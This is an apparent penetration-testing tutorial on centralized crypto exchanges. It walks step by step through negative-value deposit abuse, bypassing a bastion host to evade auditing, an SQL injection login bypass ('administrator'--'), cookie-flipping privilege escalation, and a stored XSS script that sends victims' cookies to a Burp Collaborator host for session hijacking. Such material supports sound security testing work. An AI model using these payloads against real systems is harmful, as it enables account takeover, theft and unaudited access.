# Risks in Cefi
Penetration testing for CeFi platforms involves addressing information leakage, account security, system security, and business scenario security risks.

### Introduction:
CeFi penetration testing refers to a comprehensive security assessment of the systems, networks, and applications of centralized financial institutions by simulating real hacker attacks. Through such testing, potential vulnerabilities can be discovered and fixed, and network security defenses can be strengthened to ensure that the assets and data of financial institutions and users are adequately protected. We're going to outline some of the penetration steps involved with CeFi.

### Order book value payment vulnerability:
In a certain exchange's deposit application, the value range of recharge data is not validated, leading to a negative value chargeback vulnerability in transactions.
![Image text](/pic/cefi1.png)

Step 1: Inputting a negative value.

![Image text](/pic/cefi2.png)

Step 2: After clicking on the confirmation, the two negative values can be reversed and turned into positive values.

![Image text](/pic/cefi3.png)

The recharge interface lacks proper validation and filtering of numerical symbols, which poses a certain security risk.

### Bastion host bypass：
Step 1: First, access Server_A 192.168.31.18 through the bastion host. Since the root password is managed by the bastion host, the root password for Server_B 192.168.31.232 is unknown. 

Employees can establish passwordless login by using the following command: ssh-keygen -b 2048.

![Image text](/pic/cefi4.webp)

Step 2: Access Server_B 192.168.31.232 once again through the bastion host. 

Import the generated public key from the previous step into the "/root/.ssh/authorized_keys" file on 192.168.31.232.

![Image text](/pic/cefi5.avif)

Step 3: By following the above steps, accessing Server_B can be done by first accessing Server_A through the bastion host, and then directly SSHing from Server_A to Server_B.

![Image text](/pic/cefi6.png)

While operations on Server_A can be audited through the bastion host (through session recording), let's assume that Server_A is not managed by the bastion host, and only Server_B is managed. In this case, bypassing the bastion host would result in all administrative operations on Server_B not being audited or recorded.

### Arbitrary user login：
Login bypass is one of the impacts of SQL injection, where an attacker can log in to a vulnerable web application without valid credentials. Attackers exploit SQL injection vulnerabilities to bypass the login functionality and gain access to administrator accounts without a valid password.

![Image text](/pic/cefi7.png)

Step 1: Enter the account name as "administrator" and set an arbitrary password. At this point, start capturing network traffic (packet capture).

![Image text](/pic/cefi8.png)

Step 2: After sending the packet, the login page displays a login failure message.

![Image text](/pic/cefi9.png)

Step 3: Modify the username parameter to "administrator'--".

![Image text](/pic/cefi10.png)

Successfully logged into the system.

![Image text](/pic/cefi11.png)

Regardless of whether 'administrator' is a valid username, the response always returns true, and the '--' comments out the rest of the statement. In the mentioned query, since the condition "AND password = 'password'" is commented out, and the username is "administrator", it will log in to the administrator account. If one can determine a user's account, arbitrary user login can be performed.

### Unauthorized access：

![Image text](/pic/cefi12.png)

Step 1: In Burp Proxy, open Intercept and enable response interception.

![Image text](/pic/cefi13.png)

Step 2: Modify the cookie in the response settings from "Admin=false" to "Admin=true".

![Image text](/pic/cefi14.png)

At this point, the elevation of privileges from a regular user to an administrator level has occurred.

![Image text](/pic/cefi15.png)

You can now perform administrative actions in the management panel.

![Image text](/pic/cefi16.png)

### Cookie reuse：
Currently, there is an XSS vulnerability on the comment page, which allows for the theft of cookies when a victim user views that comment. 

Step 1: Inject XSS attack code into the comment section.

<script>

fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {

method: 'POST',

mode: 'no-cors',

body:document.cookie

});

</script>

Step 2: Fill in the relevant email information and submit.

![Image text](/pic/cefi17.png)

Step 3: Use Burp Collaborator to listen for the victim's cookie information.

![Image text](/pic/cefi18.png)

At this point, you have obtained the value of the victim's cookie in the POST request packet.

![Image text](/pic/cefi19.png)

Step 4: Replace the captured victim's cookie with the obtained value.

![Image text](/pic/cefi20.png)

Successful login to the victim's account.

![Image text](/pic/cefi21.png)
